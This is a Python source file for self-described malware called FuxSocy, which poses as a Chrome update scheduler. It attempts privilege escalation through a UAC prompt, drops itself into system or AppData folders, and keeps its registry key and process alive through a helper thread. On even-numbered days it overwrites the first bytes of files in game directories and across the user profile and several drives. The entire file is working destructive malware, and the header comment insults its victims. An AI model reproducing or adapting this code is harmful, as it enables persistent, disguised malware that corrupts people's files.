#!/usr/bin/env python
# Chrome Scheduler.py
#
# Simple crypter malware to prohibit you fucking ignorant dumbass
# from playing computer games.

from time               import sleep,strftime
from libfuxsocy.dropper import Dropper
import libfuxsocy.admin
import threading
import os

class Fuxsocy(object):
    def __init__(self):
        self.new_fbarr = [123, 3, 255, 0, 100]
        self.targetdir = ['Gamania','Garena','beanfun']
        self.sleeptime = 10
        self.mode      = 1 # 0:privileged 1:regular

        self.filename = "Chrome Update Scheduler.exe"
        self.priv_install_path = "C:\\Windows\\System\\"
        self.reg_install_path  = os.getenv('APPDATA') + "\\Microsoft\\Protect\\"
        
        self.helper_name = 'System32.exe'
        self.helper_path = self.priv_install_path
        
        
    def tamper_file(self, path):
        print('[*] Tampering...' + path)
        with open(path, "r+b") as f:
            data = f.read()
            f.seek(0)
            f.write(bytes(self.new_fbarr))
        
    def search_dir(self, path):
        for dirname, dirnames, filenames in os.walk(path):
            for filename in filenames:
                self.target = dirname + '/' + filename
                sleep(0.2)
                print("Inspecting... " + self.target)
                for d in self.targetdir:
                    if d in dirname:
                        self.tamper_file(self.target)
                        sleep(0.6)
        
    def priv_escalate(self):
        if not libfuxsocy.admin.isUserAdmin():
            try:
                # try to escalate privilege through UAC prompt
                libfuxsocy.admin.runAsAdmin()
                self._dropper = Dropper(self.priv_install_path, self.filename)
                self.mode = 0
            except:
                self._dropper = Dropper(self.reg_install_path, self.filename)
        else:
            self._dropper = Dropper(self.priv_install_path, self.filename)
            self.mode = 0

    def exec_dropper(self):
        self._dropper.start()
        
    def resurrect_helper(self):
        while(True):
            self._dropper.resurrect_key(self.helper_name, self.helper_path)
            self._dropper.resurrect_proc(self.helper_name, self.helper_path)
            sleep(1.2)

    def fuxsocy(self):
        while(True):
            try:
                if int(strftime("%d"))%2 == 0:
                    print('beginning tampering operation')
                    if self.mode == 0:
                        print('Privilege escalation success.')
                        if os.path.exists(r'C:\Program Files (x86)\Gamania' + '\\'):
                            print('Gamania found.')
                            self.search_dir(r'C:\Program Files (x86)\Gamania' + '\\')
                        if os.path.exists(r'C:\Program Files (x86)\Garena'):
                            print('Garena found.')
                            self.search_dir(r'C:\Program Files (x86)\Garena' + '\\')
                        self.search_dir("C:\\Users\\" + os.getenv('username') + '\\')
                        self.search_dir("C:\\")
                        pass
                    elif self.mode == 1:
                        print('Privilege escalation failed. Fallback...')
                        self.search_dir("C:\\Users\\" + os.getenv('username') + '\\')
                    else:
                        exit
                    self.search_dir("D:\\")
                    self.search_dir("E:\\")
                    self.search_dir("F:\\")
                    self.search_dir("I:\\")
                    print('Entering sleep...')
                    sleep(self.sleeptime)
                else:
                    print('payload launch date mismatch!')
                    sleep(self.sleeptime)
            except:
                break
                        
    def start(self):
        # print start message.
        print('Executing FuxSocy')
        
        # try to escalate privilege.
        self.priv_escalate()
        
        # execute helper for process/key resurrection.
        self._thd_helper = threading.Thread(target=self.resurrect_helper, args=())
        self._thd_helper.start()

        # run the dropper.
        # first infection will not trigger tampering operation.
        if not os.path.exists(self._dropper.target_filepath) and not os.path.exists(self.priv_install_path + self.filename):
            print('First installation. Loading source of dropper.')
            self.exec_dropper()
            print('Installation successful.')
            return
        else:
            # if the payload is installed at both prvi and reg,
            # remove reg_install_path.
            if self.mode == 0 and os.path.exists(self.reg_install_path + self.filename):
                os.remove(self.reg_install_path + self.filename)
                print('Reinstalled payload to:' + self.priv_install_path + self.filename)
                return
            else:
                # perform tampering operation.
                self.fuxsocy()
                
_fuxsocy = Fuxsocy()
_fuxsocy.start()
